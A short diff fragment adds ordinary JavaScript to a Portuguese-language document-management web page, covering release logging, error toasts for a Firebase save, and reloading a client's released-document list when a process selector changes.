+            registrarLog("Documento Liberado", `Liberou "${tituloFinal}" (Assinatura: ${precisaAssinar ? 'SIM' : 'NÃO'}) para o processo ${pedidoId.substring(0,8)}`);
+            if (document.getElementById('docgen-liberar-titulo')) document.getElementById('docgen-liberar-titulo').value = '';
+            await carregarListaLiberadosCliente(pedidoId);
+        } catch (err) {
+            console.error(err);
+            showToast("Erro ao Liberar", err.message || "Falha ao salvar no Firebase.", "error");
+        } finally {
+            btn.disabled = false;
+            btn.innerHTML = orig;
+        }
+    };
+
+    // Carrega lista de liberados sempre que trocar o processo no seletor
+    document.getElementById('docgen-process-selector')?.addEventListener('change', (e) => {
+        carregarListaLiberadosCliente(e.target.value);
+    });
   </script>
 </body>
 </html>
